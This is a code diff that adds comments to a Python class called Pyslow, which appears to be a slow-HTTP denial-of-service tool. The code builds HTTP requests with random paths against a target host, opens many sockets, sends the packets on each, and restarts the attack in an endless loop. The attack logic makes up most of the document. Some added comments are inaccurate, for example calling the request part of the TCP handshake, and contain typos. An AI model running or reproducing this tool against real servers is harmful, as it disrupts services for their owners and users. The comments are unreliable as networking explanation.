@@ -119,6 +119,8 @@ class Pyslow:
         self.method = ['GET', 'POST']
         self.pkt_count = 0
 
+    #Creates the initial packet to make the connection. This is a HTTP packet, with a length of 42
+    #bytes. The user agent is determined in the fucntion above. 
     def mypkt(self):
         text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
                'Host:' + self.tgt + '\r\n' + \
@@ -127,6 +129,8 @@ class Pyslow:
         pkt = buffer(str.encode(text), 0, len(str.encode(text)))
         return pkt
 
+    #Builds the socket, then uses that socket to sent the packet made above, the first packet in
+    #the three way handshake.
     def building_socket(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
@@ -149,6 +153,8 @@ class Pyslow:
             sys.exit(cprint('[-] Canceled by user', 'red'))
         return sock
 
+    #Sends the packets added to each socket. The total number of sockets is determined by the
+    #amount of threads specified in the command arguments. 
     def sending_packets(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
@@ -170,16 +176,20 @@ class Pyslow:
             sys.exit(cprint('[-] Canceled by user', 'red'))
         return sock
 
+    #This function executes the attack.
     def doconnection(self):
         socks = 0
         fail = 0
         lsocks = []
         lhandlers = []
         cprint('\t\tBuilding sockets', 'blue')
+        #A while loop will iterate while the amount of sockets created is less than the amount of threads
+        #specified in the command argument.
         while socks < (int(self.threads)):
             try:
                 sock = self.building_socket()
                 if sock:
+                    #Adds the scoket to the lsock list.
                     lsocks.append(sock)
                     socks += 1
                     if socks > int(self.threads):
@@ -189,6 +199,7 @@ class Pyslow:
             except KeyboardInterrupt:
                 sys.exit(cprint('[-] Canceled by user', 'red'))
         cprint('\t\tSending packets', 'blue')
+        #Iterates through the socket list and sends the build packet on each socket.
         while socks < int(self.threads):
             try:
                 handler = self.sending_packets()
@@ -457,6 +468,7 @@ Example:
             except KeyboardInterrupt:
                 sys.exit(cprint('[-] Canceled by user', 'red'))
     elif args.Pyslow:
+        #Checking that the arguments for the attack are te correct types.
         try:
             tgt = args.d
             port = args.p
@@ -465,6 +477,7 @@ Example:
             threads = int(args.T)
         except Exception as e:
             print('[-]', e)
+        #An infinite loop that will create a new Pyslow object once the the interval has elapsed.
         while 1:
             try:
                 worker = Pyslow(tgt, port, to, threads, st)
